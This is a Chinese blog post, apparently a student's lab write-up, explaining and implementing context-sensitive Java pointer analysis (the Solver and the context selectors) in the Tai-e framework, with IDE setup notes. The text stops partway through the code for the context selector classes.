    <content type="html"><![CDATA[<h1 id="相关配置"><a class="markdownIt-Anchor" href="#相关配置"></a> 相关配置</h1><h2 id="java配置"><a class="markdownIt-Anchor" href="#java配置"></a> java配置</h2><ol><li>设置 <code>Settings -&gt; Project Structure -&gt; SDK: java17 -- Language level: 17 - Sealed types, always-strict floating-point semantics</code></li><li>设置 <code>Settings -&gt; Build,Execution,Deployment -&gt; Gradle -&gt; Build and run using: interlliJ IDEA(下面那个也一样)</code></li></ol><h2 id="dot-png"><a class="markdownIt-Anchor" href="#dot-png"></a> dot-&gt;png</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos">dot -Tpng <span class="hljs-built_in">tree</span>.dot -o <span class="hljs-built_in">tree</span>.png<br># 其中<span class="hljs-built_in">tree</span>.dot为dot形式名称，<span class="hljs-built_in">tree</span>.png为图片png形式名称<br></code></pre></td></tr></table></figure><h1 id="lab6"><a class="markdownIt-Anchor" href="#lab6"></a> Lab6</h1><h2 id="理解"><a class="markdownIt-Anchor" href="#理解"></a> 理解</h2><p>​这里 <code>Solver</code> 的代码和 A5 中的大同小异，不过是将 C.I. 中 PointFlowGraph 负责的 API 转化为 C.S. 中 CSManager 负责的 API。然后同时需要实现 三种 Select 方法的两种情况，而对于每个 Selece 方法，都有对于静态方法调用的 <code>selectContext</code>，对于实例方法调用的 <code>selectContext</code>，对于堆抽象的 <code>selectHeapContext</code>，这里的操作就是根据 k-limits 的 k 来填充一个list，然后根据规则删去之前的context。</p><h2 id="题目相关"><a class="markdownIt-Anchor" href="#题目相关"></a> 题目相关</h2><ul><li>为 Java 实现一个上下文敏感的指针分析框架</li><li>实现几种常见的上下文敏感策略</li></ul><h2 id="上下文敏感指针分析"><a class="markdownIt-Anchor" href="#上下文敏感指针分析"></a> 上下文敏感指针分析</h2><h3 id="analysis"><a class="markdownIt-Anchor" href="#analysis"></a> analysis</h3><ul><li><code>pascal.taie.analysis.pta.core.cs.context.Context</code><ul><li>这个接口就是表示上下文敏感的指针分析中的上下文，主要是看 Solver 使用的方法来决定当前节点的上下文。</li></ul></li><li><code>pascal.taie.analysis.pta.core.cs.element.CSManager</code><ul><li>该类管理所有需要用到上下文的元素和所有上下文敏感的指针。也就是说，<code>CSElement</code> 或 <code>Pointer</code> 的所有子类的实例（每当你需要用到时）都需要通过这个类的相关 API 来取得。它替代了 A5 中的 PointFlowGraph，二者可以等效看待，不过 CSManager 拥有更多的功能</li></ul></li><li><code>pascal.taie.analysis.pta.core.cs.selector.ContextSelector</code><ul><li>这个就是 Solver 需要实现的接口，该类是上下文敏感指针分析框架和具体的上下文敏感策略（如调用点敏感、对象敏感等）之间的接口。该类有 4 个 API，其中一个 API 返回空上下文，另外三个 API 分别为静态方法、实例方法和堆对象（heap object）选择上下文。这里主要在 Invoke 和 New 时根据不同的 Solver 方法负责生成目标方法和新创建对象的上下文。</li></ul></li></ul><h3 id="具体代码"><a class="markdownIt-Anchor" href="#具体代码"></a> 具体代码</h3><h4 id="代码总览"><a class="markdownIt-Anchor" href="#代码总览"></a> 代码总览</h4><p>​这里和 A5 的代码要求相似，需要完成指针分析的大致算法框架。同时，这里的代码和 A5 大致一样，唯一注意的就是使用了 CSManager 替代了 PointFlowGraph。同时添加了上下文的选择(这个在StmtProcessor类中表现的明显)</p><p>​需要完成实现 <code>Solve类</code> 中的方法</p><ul><li><code>void addReachable(CSMethod)</code></li><li><code>void addPFGEdge(Pointer,Pointer)</code></li><li><code>void analyze()</code></li><li><code>PointsToSet propagate(Pointer,PointsToSet)</code></li><li><code>void processCall(CSVar,CSObj)</code></li></ul><h4 id="addreachable"><a class="markdownIt-Anchor" href="#addreachable"></a> addReachable</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Processes new reachable context-sensitive method.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addReachable</span><span class="hljs-params">(CSMethod csMethod)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-keyword">if</span> (callGraph.addReachableMethod(csMethod))&#123;<br>        csMethod.getMethod().getIR().forEach(stmt -&gt; &#123;<br>            <span class="hljs-type">StmtProcessor</span> <span class="hljs-variable">stmtprocess</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StmtProcessor</span>(csMethod);<br>            stmt.accept(stmtprocess);<span class="hljs-comment">//依旧使用访问者模式</span><br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​下面就是访问者模式针对不同的 stmt 所做出的不同举动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * Processes the statements in context-sensitive new reachable methods.</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StmtProcessor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">StmtVisitor</span>&lt;Void&gt; &#123;<br><br>       <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> CSMethod csMethod;<br><br>       <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Context context;<br><br>       <span class="hljs-keyword">private</span> <span class="hljs-title function_">StmtProcessor</span><span class="hljs-params">(CSMethod csMethod)</span> &#123;<br>           <span class="hljs-built_in">this</span>.csMethod = csMethod;<br>           <span class="hljs-built_in">this</span>.context = csMethod.getContext();<br>       &#125;<br><br>       <span class="hljs-comment">// TODO - if you choose to implement addReachable()</span><br>       <span class="hljs-comment">//  via visitor pattern, then finish me</span><br>       <span class="hljs-comment">// 1. New x = new T() -&gt; add &lt;c: x, &#123;c: o_i&#125;&gt; to Wl</span><br>       <span class="hljs-meta">@Override</span><br>       <span class="hljs-keyword">public</span> Void <span class="hljs-title function_">visit</span><span class="hljs-params">(New stmt)</span>&#123;<br>           <span class="hljs-comment">// 1.1 get the c: x</span><br>           <span class="hljs-type">Pointer</span> <span class="hljs-variable">pointer</span> <span class="hljs-operator">=</span> csManager.getCSVar(context, stmt.getLValue());<br>           <span class="hljs-comment">// 1.2 get the c : o_i</span><br>           <span class="hljs-type">Obj</span> <span class="hljs-variable">newT</span> <span class="hljs-operator">=</span> heapModel.getObj(stmt); <span class="hljs-comment">// get o_i</span><br>           <span class="hljs-comment">// These two c&#x27;s are different, the c of c: o_i is k-1 -&gt; 堆上下文不一定就使用方法的上下文,需要用 ContextSelector选择</span><br>           <span class="hljs-type">Context</span> <span class="hljs-variable">heapContext</span> <span class="hljs-operator">=</span> contextSelector.selectHeapContext(csMethod, newT);<br>           <span class="hljs-comment">// get c: o_i due to the heap context</span><br>           <span class="hljs-type">CSObj</span> <span class="hljs-variable">csObj</span> <span class="hljs-operator">=</span> csManager.getCSObj(heapContext, newT);<br>           <span class="hljs-type">PointsToSet</span> <span class="hljs-variable">pointsToSet</span> <span class="hljs-operator">=</span> PointsToSetFactory.make(csObj);<br>           workList.addEntry(pointer, pointsToSet);<br>           <span class="hljs-keyword">return</span> StmtVisitor.<span class="hljs-built_in">super</span>.visit(stmt);<br>       &#125;<br>       <span class="hljs-comment">// 2. Copy x = y</span><br>       <span class="hljs-meta">@Override</span><br>       <span class="hljs-keyword">public</span> Void <span class="hljs-title function_">visit</span><span class="hljs-params">(Copy stmt)</span> &#123;<br>           <span class="hljs-type">Pointer</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> csManager.getCSVar(context, stmt.getLValue());<br>           <span class="hljs-type">Pointer</span> <span class="hljs-variable">source</span> <span class="hljs-operator">=</span> csManager.getCSVar(context, stmt.getRValue());<br>           addPFGEdge(source, target);<br>           <span class="hljs-keyword">return</span> StmtVisitor.<span class="hljs-built_in">super</span>.visit(stmt);<br>       &#125;<br>       <span class="hljs-comment">// 3. x = y.f</span><br>       <span class="hljs-meta">@Override</span><br>       <span class="hljs-keyword">public</span> Void <span class="hljs-title function_">visit</span><span class="hljs-params">(LoadField stmt)</span> &#123;<br>           <span class="hljs-keyword">if</span>(!stmt.isStatic()) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>           <span class="hljs-type">Var</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> stmt.getLValue();<br>           <span class="hljs-type">JField</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> stmt.getFieldRef().resolve();<br>           addPFGEdge(csManager.getStaticField(f),csManager.getCSVar(context, x));<br>           <span class="hljs-keyword">return</span> StmtVisitor.<span class="hljs-built_in">super</span>.visit(stmt);<br>       &#125;<br>       <span class="hljs-comment">// 4. x.f = y</span><br>       <span class="hljs-meta">@Override</span><br>       <span class="hljs-keyword">public</span> Void <span class="hljs-title function_">visit</span><span class="hljs-params">(StoreField stmt)</span> &#123;<br>           <span class="hljs-keyword">if</span> (!stmt.isStatic()) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>           <span class="hljs-type">JField</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> stmt.getFieldRef().resolve();<br>           <span class="hljs-type">Var</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> stmt.getRValue();<br>           addPFGEdge(csManager.getCSVar(context,y), csManager.getStaticField(f));<br>           <span class="hljs-keyword">return</span> StmtVisitor.<span class="hljs-built_in">super</span>.visit(stmt);<br>       &#125;<br>       <span class="hljs-comment">// 5. y = x.m(...) 静态方法处理</span><br>       <span class="hljs-meta">@Override</span><br>       <span class="hljs-keyword">public</span> Void <span class="hljs-title function_">visit</span><span class="hljs-params">(Invoke stmt)</span> &#123;<br>           <span class="hljs-keyword">if</span> (!stmt.isStatic()) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>           <span class="hljs-type">MethodRef</span> <span class="hljs-variable">methodRef</span> <span class="hljs-operator">=</span> stmt.getMethodRef();<br>           <span class="hljs-type">JMethod</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> methodRef.getDeclaringClass().getDeclaredMethod(methodRef.getSubsignature());<br>           <span class="hljs-type">CSCallSite</span> <span class="hljs-variable">csCallSite</span> <span class="hljs-operator">=</span> csManager.getCSCallSite(context, stmt);<br>           <span class="hljs-type">Context</span> <span class="hljs-variable">c_t</span> <span class="hljs-operator">=</span> contextSelector.selectContext(csCallSite, method);<br>           <span class="hljs-type">CSMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> csManager.getCSMethod(c_t, method);<span class="hljs-comment">// 这里需要与csMethod区分，csMethod指向的是当前的c</span><br>           processEachCall(context, stmt, c_t, ctMethod);<br>           <span class="hljs-keyword">return</span> StmtVisitor.<span class="hljs-built_in">super</span>.visit(stmt);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>​这里的代码和 A5 大同小异，不过需要注意方法的上下文和堆对象的上下文不是同样的，这个时候需要注意使用不同的上下文获取方法。</p><h4 id="addpfgedge"><a class="markdownIt-Anchor" href="#addpfgedge"></a> addPFGEdge</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Adds an edge &quot;source -&gt; target&quot; to the PFG.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addPFGEdge</span><span class="hljs-params">(Pointer source, Pointer target)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-comment">// 1. if s -&gt; t not belong PFG and add it</span><br>    <span class="hljs-keyword">if</span> (pointerFlowGraph.addEdge(source, target))&#123;<br>        <span class="hljs-comment">// 2. if pt(s) is not empty, add &lt;t, pt(s)&gt; to Wl</span><br>        <span class="hljs-keyword">if</span> (!source.getPointsToSet().isEmpty()) &#123;<br>            workList.addEntry(target, source.getPointsToSet());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="analyze"><a class="markdownIt-Anchor" href="#analyze"></a> analyze</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * Processes work-list entries until the work-list is empty.</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">analyze</span><span class="hljs-params">()</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-keyword">while</span> (!workList.isEmpty())&#123;<br>           <span class="hljs-comment">// 1. remove &lt;n,pts&gt; from WL</span><br>           WorkList.<span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> workList.pollEntry();<br>           <span class="hljs-type">Pointer</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> entry.pointer();<br>           <span class="hljs-type">PointsToSet</span> <span class="hljs-variable">pts</span> <span class="hljs-operator">=</span> entry.pointsToSet();<br>           <span class="hljs-comment">// 2. get the Δ</span><br>           <span class="hljs-type">PointsToSet</span> <span class="hljs-variable">delta</span> <span class="hljs-operator">=</span> propagate(n, pts);<br>           <span class="hljs-comment">// 3. if n represents a variable x then</span><br>           <span class="hljs-keyword">if</span> (n <span class="hljs-keyword">instanceof</span> CSVar csVar)&#123;<br>               <span class="hljs-comment">// 3.1 foreach oi in Δ do</span><br>               <span class="hljs-type">Var</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> csVar.getVar();<br>               <span class="hljs-type">Context</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> csVar.getContext();<br>               <span class="hljs-keyword">if</span> (delta.isEmpty()) <span class="hljs-keyword">continue</span>;<br>               delta.getObjects().forEach(csObj -&gt; &#123;<br>                   <span class="hljs-comment">// 3.1.1 foreach y = x.f in S do</span><br>                   x.getLoadFields().forEach(loadField -&gt; &#123;<br>                       <span class="hljs-type">Var</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> loadField.getLValue();<br>                       <span class="hljs-type">JField</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> loadField.getFieldRef().resolve();<br>                       addPFGEdge(csManager.getInstanceField(csObj, f), csManager.getCSVar(c, y));<br>                   &#125;);<br>                   <span class="hljs-comment">// 3.1.2 foreach x.f = y in S do</span><br>                   x.getStoreFields().forEach(storeField -&gt; &#123;<br>                       <span class="hljs-type">JField</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> storeField.getFieldRef().resolve();<br>                       <span class="hljs-type">Var</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> storeField.getRValue();<br>                       addPFGEdge(csManager.getCSVar(c, y), csManager.getInstanceField(csObj, f));<br>                   &#125;);<br>                   <span class="hljs-comment">// 3.1.3 foreach y = x[*] in S do</span><br>                   x.getLoadArrays().forEach(loadArray -&gt; &#123;<br>                       <span class="hljs-type">Var</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> loadArray.getLValue();<br>                       addPFGEdge(csManager.getArrayIndex(csObj), csManager.getCSVar(c, y));<br>                   &#125;);<br>                   <span class="hljs-comment">// 3.1.4 foreach x[*] = y in S do</span><br>                   x.getStoreArrays().forEach(storeArray -&gt; &#123;<br>                       <span class="hljs-type">Var</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> storeArray.getRValue();<br>                       addPFGEdge(csManager.getCSVar(c, y), csManager.getArrayIndex(csObj));<br>                   &#125;);<br>                   <span class="hljs-comment">// 3.1.5 foreach y = x.m(...) in S do</span><br>                   processCall(csManager.getCSVar(c, x), csObj);<br>               &#125;);<br>           &#125;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><h4 id="propagate"><a class="markdownIt-Anchor" href="#propagate"></a> propagate</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Propagates pointsToSet to pt(pointer) and its PFG successors,</span><br><span class="hljs-comment">     * returns the difference set of pointsToSet and pt(pointer).</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> PointsToSet <span class="hljs-title function_">propagate</span><span class="hljs-params">(Pointer pointer, PointsToSet pointsToSet)</span> &#123;<br>        <span class="hljs-comment">/* TODO - finish me */</span><br>        <span class="hljs-comment">// 1. pts is not empty</span><br>        <span class="hljs-type">PointsToSet</span> <span class="hljs-variable">delta</span> <span class="hljs-operator">=</span> PointsToSetFactory.make();<br>        <span class="hljs-keyword">if</span> (pointsToSet.isEmpty()) <span class="hljs-keyword">return</span> delta;<br>        <span class="hljs-comment">// 2. Δ = pts - pt(n) and pt(n) U= pts</span><br>        pointsToSet.forEach(csObj -&gt; &#123;<br>            <span class="hljs-keyword">if</span> (pointer.getPointsToSet().addObject(csObj))&#123;<span class="hljs-comment">// Statement has been added with addObject</span><br>                delta.addObject(csObj);<br><span class="hljs-comment">//                if you use pointer.getPointsToSet().contains(csObj) to check whether the object is in the set,</span><br><span class="hljs-comment">//                you need add the following statement `pointer.getPointsToSet().addObject(csObj);`</span><br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">// 3. foreach m in succ(n) do</span><br>        <span class="hljs-keyword">if</span> (delta.isEmpty()) <span class="hljs-keyword">return</span> delta; <span class="hljs-comment">// prevent point to empty set(delta)</span><br>        pointerFlowGraph.getSuccsOf(pointer).forEach(suc -&gt; &#123;<br>            workList.addEntry(suc, delta);<br>        &#125;);<br>        <span class="hljs-keyword">return</span> delta;<br>    &#125;<br></code></pre></td></tr></table></figure><p>​这里就和 A5 一样，如果使用的是 <code>pointer.getPointsToSet().addObject(csObj);</code>，那么就直接在判断中添加了指针指向的对象。</p><h4 id="processcall"><a class="markdownIt-Anchor" href="#processcall"></a> processCall</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * Processes instance calls when points-to set of the receiver variable changes.</span><br><span class="hljs-comment">    *</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span> recv    the receiver variable</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span> recvObj set of new discovered objects pointed by the variable.</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processCall</span><span class="hljs-params">(CSVar recv, CSObj recvObj)</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-comment">// processCall -&gt; processCall(c: x, c_&#x27;: o_i)</span><br>       <span class="hljs-comment">// 1. foreach l: r = x.k(a1,…,an) ∈ S do</span><br>       <span class="hljs-type">Var</span> <span class="hljs-variable">var</span> <span class="hljs-operator">=</span> recv.getVar();<br>       <span class="hljs-keyword">var</span>.getInvokes().forEach(x -&gt; &#123;<br>           <span class="hljs-comment">// 2. m = Dispatch(o_i, k)</span><br>           <span class="hljs-type">JMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> resolveCallee(recvObj, x);<br>           <span class="hljs-type">Var</span> <span class="hljs-variable">m_this</span> <span class="hljs-operator">=</span> m.getIR().getThis();<br>           <span class="hljs-comment">// 3. c_t = Select(c, l, c_&#x27;:o_i)</span><br>           <span class="hljs-type">Context</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> recv.getContext();<br>           <span class="hljs-type">CSCallSite</span> <span class="hljs-variable">csCallSite</span> <span class="hljs-operator">=</span> csManager.getCSCallSite(c, x);<br>           <span class="hljs-type">Context</span> <span class="hljs-variable">c_t</span> <span class="hljs-operator">=</span> contextSelector.selectContext(csCallSite, recvObj, m);<br>           <span class="hljs-comment">// 3. add &lt;c_t: m_this, &#123;c_&#x27;: o_i&#125;&gt; to WL</span><br>           workList.addEntry(csManager.getCSVar(c_t, m_this), PointsToSetFactory.make(recvObj));<br>           <span class="hljs-comment">// 4. get the c_t: m and process the call</span><br>           <span class="hljs-type">CSMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> csManager.getCSMethod(c_t, m);<br>           processEachCall(c, x, c_t, ctMethod);<br>       &#125;);<br><br>   &#125;<br></code></pre></td></tr></table></figure><p>​下面是 <code>processEachCall</code>，主要是将静态方法和实例方法调用的共同点抽离出来，以方面前面 addReachable 对于静态方法调用的处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processEachCall</span><span class="hljs-params">(Context c, Invoke x, Context c_t, CSMethod ctMethod)</span>&#123;<br>       <span class="hljs-comment">// 1. get the c: l and c_t: m</span><br>       <span class="hljs-type">CSCallSite</span> <span class="hljs-variable">callSite</span> <span class="hljs-operator">=</span> csManager.getCSCallSite(c, x);<br>       <span class="hljs-comment">// 2. if c: l -&gt; c_t: m is not in CG then</span><br>       <span class="hljs-keyword">if</span> (callGraph.addEdge(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Edge</span>&lt;&gt;(CallGraphs.getCallKind(x), callSite, ctMethod)))&#123;<br>           <span class="hljs-comment">// 3. add reachable(c_t: m)</span><br>           addReachable(ctMethod);<br>           <span class="hljs-comment">// 4. foreach c: ai = c_t: pi ∈ S do</span><br>           <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; x.getInvokeExp().getArgCount(); i ++)&#123;<br>               <span class="hljs-type">Var</span> <span class="hljs-variable">arg</span> <span class="hljs-operator">=</span> x.getInvokeExp().getArg(i);<br>               <span class="hljs-type">Var</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> ctMethod.getMethod().getIR().getParam(i);<br>               addPFGEdge(csManager.getCSVar(c, arg), csManager.getCSVar(c_t, param));<br>           &#125;<br>           <span class="hljs-comment">// 5. add the edge (c_t: m_ret, c: r) to PFG</span><br>           <span class="hljs-keyword">if</span> (x.getLValue() != <span class="hljs-literal">null</span>)&#123;<br>               ctMethod.getMethod().getIR().getReturnVars().forEach(m_ret -&gt; &#123;<br>                   addPFGEdge(csManager.getCSVar(c_t, m_ret), csManager.getCSVar(c, x.getLValue()));<br>               &#125;);<br>           &#125;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="常见的上下文敏感策略"><a class="markdownIt-Anchor" href="#常见的上下文敏感策略"></a> 常见的上下文敏感策略</h2><h3 id="analysis-2"><a class="markdownIt-Anchor" href="#analysis-2"></a> analysis</h3><ul><li><p><code>pascal.taie.analysis.pta.core.cs.selector.ContextSelector</code></p><ul><li>这个就是 Solver 需要实现的接口，通过它来补充对于静态方法调用，实例方法调用，对抽象上下文的选择。</li><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202404080914130.png" alt="image-20240408091408078" /></li></ul></li><li><p><code>pascal.taie.analysis.pta.core.cs.context.ListContext</code></p><ul><li>该类实现了 <code>Context</code> 接口，它将每个上下文表示为一个由若干同类型元素组成的有序列表（对三种上下文敏感策略，该列表分别采用不同的元素来表示上下文：调用点敏感使用的元素为 <code>Invoke</code>，对象敏感使用的元素为 <code>Obj</code>，类型敏感使用的元素为 <code>Type</code>）。</li><li>简单而言，它封装了不同的上下文，使得可以直接利用它 list 的属性直接添加对象的上下文到上下文列表中</li></ul></li></ul><h3 id="具体代码-2"><a class="markdownIt-Anchor" href="#具体代码-2"></a> 具体代码</h3><h4 id="代码总览-2"><a class="markdownIt-Anchor" href="#代码总览-2"></a> 代码总览</h4><ul><li><code>pascal.taie.analysis.pta.core.cs.selector._1CallSelector</code></li><li><code>pascal.taie.analysis.pta.core.cs.selector._1ObjSelector</code></li><li><code>pascal.taie.analysis.pta.core.cs.selector._1TypeSelector</code></li><li><code>pascal.taie.analysis.pta.core.cs.selector._2CallSelector</code></li><li><code>pascal.taie.analysis.pta.core.cs.selector._2ObjSelector</code></li><li><code>pascal.taie.analysis.pta.core.cs.selector._2TypeSelector</code></li></ul><p>主要实现的就是上面个6个类中的三个方法</p><p>为了给方法选择上下文，你需要为每个 selector 实现：</p><ul><li><code>Context selectContext(CSCallSite,JMethod)</code></li><li><code>Context selectContext(CSCallSite,CSObj,JMethod)</code></li></ul><p>为了选择堆上下文，你需要为每个 selector 实现：</p><ul><li><code>Context selectHeapContext(CSMethod,Obj)</code></li></ul><h4 id="_1callselector"><a class="markdownIt-Anchor" href="#_1callselector"></a> _1CallSelector</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 